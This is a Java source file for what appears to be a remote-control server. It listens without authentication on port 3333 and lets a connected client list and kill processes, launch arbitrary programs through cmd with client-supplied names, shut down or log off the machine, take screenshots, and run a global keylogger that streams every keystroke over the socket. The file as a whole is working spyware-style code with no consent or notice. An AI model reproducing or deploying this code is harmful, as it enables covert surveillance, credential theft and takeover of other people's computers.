package server;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.Robot;
import java.awt.image.BufferedImage;

import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;

import com.github.kwhat.jnativehook.*;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class ServerController {

    private BufferedWriter bw;
    private OutputStream outputStream;

    public class MyThread extends Thread {
        public void run() {
            try {
                ServerSocket ss = new ServerSocket(3333);
                Socket s = ss.accept();
                outputStream = s.getOutputStream();
                BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
                bw = new BufferedWriter(new OutputStreamWriter(s.getOutputStream()));
                int mode = Integer.parseInt(br.readLine());
                while (mode != -1) {
                    switch (mode) {
                        case 1 -> getRunningProcesses();
                        case 2 -> shutdown();
                        case 3 -> logout();
                        case 4 -> getImage();
                        case 5 -> {
                            String zs = br.readLine();
                            kill(zs);
                        }
                        case 6 -> getRunningApplication();
                        case 7 -> {
                            String zs = br.readLine();
                            startProcess(zs);
                        }
                        case 8 -> startKeylogger();
                        case 9 -> stopKeylogger();
                    }
                    mode = Integer.parseInt(br.readLine());
                }
                br.close();
                s.close();
                ss.close();
            } catch (IOException | AWTException | NativeHookException e) {
                throw new RuntimeException(e);
            }
        }
    }

    private final MyThread myThread = new MyThread();
    public void openPort() {
        myThread.start();
    }

    private NativeKeyListener nativeKeyListener = new NativeKeyListener() {
        @Override
        public void nativeKeyTyped(NativeKeyEvent nativeEvent)
        {
        }

        @Override
        public void nativeKeyReleased(NativeKeyEvent nativeEvent)
        {
            String keyText=NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
            System.out.println("User typed: "+keyText);
            try {
                bw.write(keyText);
                bw.newLine();
                bw.flush();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

        @Override
        public void nativeKeyPressed(NativeKeyEvent nativeEvent)
        {
        }
    };

    public void getRunningProcesses() throws IOException {
        ProcessBuilder builder = new ProcessBuilder("tasklist.exe", "/fo", "csv", "/nh");
        builder.redirectErrorStream(true);
        Process p = builder.start();
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while (true) {
            line = r.readLine();
            if (line == null) {
                break;
            }
            bw.write(line);
            bw.newLine();
            bw.flush();
        }
        String zz = "\"stop\", \"pls\", \"pls\", \"pls\", \"pls\"";
        bw.write(zz);
        bw.newLine();
        bw.flush();
    }

    public void getRunningApplication() throws IOException {
        String cmd = "powershell Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object -Property Name, Id, Mainwindowtitle | Export-Csv -path .\\app.csv -NoTypeInformation ; Get-Content -path .\\app.csv";
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        r.readLine();
        while (true) {
            line = r.readLine();
            if (line == null) {
                break;
            }
            bw.write(line);
            bw.newLine();
            bw.flush();
        }
        String zz = "\"stop\", \"pls\", \"pls\"";
        bw.write(zz);
        bw.newLine();
        bw.flush();
    }

    public void shutdown() {
        ProcessBuilder processBuilder = new ProcessBuilder();
        try {
            processBuilder.command("cmd", "/c" ,"shutdown -s");
            Process process = processBuilder.start();
            process.waitFor();
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    public void logout() throws IOException {
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("cmd", "/c", "shutdown -l");
        processBuilder.start();
    }

    public void getImage() throws IOException, AWTException {
        Robot robot = new Robot();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        BufferedImage bimg;
        Rectangle rect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        bimg = robot.createScreenCapture(rect);
        ImageIO.write(bimg, "jpg", byteArrayOutputStream);
        byte[] size = ByteBuffer.allocate(4).putInt(byteArrayOutputStream.size()).array();
        outputStream.write(size);
        outputStream.write(byteArrayOutputStream.toByteArray());
        outputStream.flush();
        System.out.println("Captured");
    }

    public void kill(String id) throws IOException {
        System.out.println(id);
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("taskkill", "/F", "/PID", id);
        processBuilder.start();
    }

    public void startProcess(String name) throws IOException
    {
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("cmd", "/c,", "start", name);
        processBuilder.start();
    }
    public void startKeylogger() throws NativeHookException {
        System.out.println("yespapi");
        if (!GlobalScreen.isNativeHookRegistered())
            GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(nativeKeyListener);
    }
    public void stopKeylogger() throws NativeHookException
    {
        System.out.println("nopapi");
        GlobalScreen.removeNativeKeyListener(nativeKeyListener);
    }
}
